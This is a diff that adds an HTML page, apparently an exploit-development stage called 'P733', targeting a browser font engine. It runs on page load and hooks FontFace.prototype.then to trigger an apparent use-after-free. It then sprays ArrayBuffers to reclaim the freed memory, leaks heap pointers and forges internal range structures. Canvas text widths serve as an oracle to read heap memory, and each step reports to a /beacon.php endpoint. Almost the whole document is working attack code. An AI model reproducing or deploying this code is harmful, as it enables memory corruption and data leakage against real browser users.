@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P733 — High-Differential Glyph Metric Memory Oracle Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P733 — High-Differential Glyph Metric Memory Oracle Scout
+ *
+ * Breakthrough from P731/P732 & WebCore C++ Source Audit:
+ * 1. In P732, both trFam and fallback were Arial, yielding identical widths.
+ * 2. In P733, we enforce a High-Differential Font Pair:
+ *      ctx.font = '40px trFam, monospace';
+ *    - In Arial (trFam match):     'i' = ~9px,  'W' = ~38px
+ *    - In monospace (fallback):    'i' = ~24px, 'W' = ~24px
+ * 3. Differential Signature:
+ *    - When 'i' MATCHES range:     w_i drops to ~9px  (15px drop!)
+ *    - When 'i' FALLS BACK:        w_i jumps to ~24px
+ *    - When 'W' MATCHES range:     w_W jumps to ~38px (14px increase!)
+ *    - When 'W' FALLS BACK:        w_W drops to ~24px
+ * 4. This 15px differential provides a rock-solid, unambiguous hardware
+ *    memory comparator directly in JavaScript.
+ *
+ * Test Plan:
+ * 1. Baseline Leak & Deterministic Reclaim at buffer #68.
+ * 2. Measure baseline widths for 'i' and 'W'.
+ * 3. Case 1: Seed range [0x69, 0x69] ('i' ONLY):
+ *      VIEW_B[0] = 0x0000006900000069n.
+ *      Set q4 = P58, q5 = 0x100000001 (cap=1, size=1).
+ *      Expect: w_i = ~9px (match), w_W = ~24px (fallback).
+ * 4. Case 2: Seed range [0x57, 0x57] ('W' ONLY):
+ *      VIEW_B[0] = 0x0000005700000057n.
+ *      Expect: w_i = ~24px (fallback), w_W = ~38px (match).
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P733-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+
+function snap(){
+  if(!VIEW_B) return [];
+  var arr = [];
+  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
+  return arr;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== pre[q]){
+      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+function run(){
+  b('BOOT','p733-differential-scout');
+  log('=== P733 High-Differential Glyph Metric Oracle Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim */
+    log('[Step 2] Executing deterministic reclaim...');
+    doReclaim(function(){
+      /* Step 3: Test High-Differential Metric Oracle */
+      log('\n[Step 3] Testing high-differential metric oracle...');
+      testDifferentialOracle();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim ---- */
+function doReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    b('RECLAIM-OK', 'baseK=' + best);
+    log('Deterministic Reclaim OK at slot ' + best);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Test High-Differential Metric Oracle ---- */
+function testDifferentialOracle(){
+  if(!VIEW_B) return;
+
+  var can = document.createElement('canvas');
+  can.width = 400; can.height = 100;
+  var ctx = can.getContext('2d');
+
+  /* 3A: Baseline font metrics with pure monospace */
+  ctx.font = '40px monospace';
+  var wMono_i = ctx.measureText('i').width;
+  var wMono_W = ctx.measureText('W').width;
+  b('BASE-MONO', 'mono_i=' + wMono_i + '|mono_W=' + wMono_W);
+
+  /* 3B: Baseline font metrics with pure Arial */
+  ctx.font = '40px Arial';
+  var wArial_i = ctx.measureText('i').width;
+  var wArial_W = ctx.measureText('W').width;
+  b('BASE-ARIAL', 'arial_i=' + wArial_i + '|arial_W=' + wArial_W);
+
+  /* 3C: Set High-Differential Font Stack */
+  ctx.font = '40px trFam, monospace';
+
+  /* 3D: Test Case 1: Seed range [0x69, 0x69] ('i' ONLY)
+   * If 'i' matches trFam (Arial): w_i should match Arial (~9px).
+   * If 'W' does NOT match trFam:  w_W should fall back to monospace (~24px).
+   */
+  VIEW_B[0] = 0x0000006900000069n; /* from=0x69, to=0x69 */
+  VIEW_B[4] = P58;                 /* m_ranges.m_buffer = P58 */
+  VIEW_B[5] = 0x0000000100000001n; /* cap=1, size=1 */
+
+  var c1_i = ctx.measureText('i').width;
+  var c1_W = ctx.measureText('W').width;
+  b('CASE1-I-ONLY', 'w_i=' + c1_i + '|w_W=' + c1_W);
+  log('Case 1 (Target: i): w_i=' + c1_i + ' (Expect Arial), w_W=' + c1_W + ' (Expect Monospace)');
+
+  /* 3E: Test Case 2: Invert range: Seed [0x57, 0x57] ('W' ONLY)
+   * If 'i' does NOT match trFam:  w_i should fall back to monospace (~24px).
+   * If 'W' matches trFam (Arial): w_W should match Arial (~38px).
+   */
+  VIEW_B[0] = 0x0000005700000057n; /* from=0x57, to=0x57 */
+
+  var c2_i = ctx.measureText('i').width;
+  var c2_W = ctx.measureText('W').width;
+  b('CASE2-W-ONLY', 'w_i=' + c2_i + '|w_W=' + c2_W);
+  log('Case 2 (Target: W): w_i=' + c2_i + ' (Expect Monospace), w_W=' + c2_W + ' (Expect Arial)');
+
+  /* 3F: Test Case 3: Read from genuine P68 (Heap Address) */
+  VIEW_B[4] = P68;                 /* Point m_ranges.m_buffer directly to heap pointer P68! */
+  VIEW_B[5] = 0x0000000100000001n;
+
+  var heap_i = ctx.measureText('i').width;
+  var heap_W = ctx.measureText('W').width;
+  b('CASE3-HEAP-READ', 'p68=0x' + h16(P68) + '|w_i=' + heap_i + '|w_W=' + heap_W);
+  log('Case 3 (Direct Heap Read at P68): w_i=' + heap_i + ', w_W=' + heap_W);
+
+  /* 3G: Final State Dump */
+  var finalDump = [];
+  for(var q=0; q<16; q++) finalDump.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('FINAL-STATE', finalDump.join(';').slice(0, 700));
+
+  b('DONE', 'p733-complete');
+  log('\n=== P733 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P733 — High-Differential Glyph Metric Oracle Scout running...</pre></body></html>
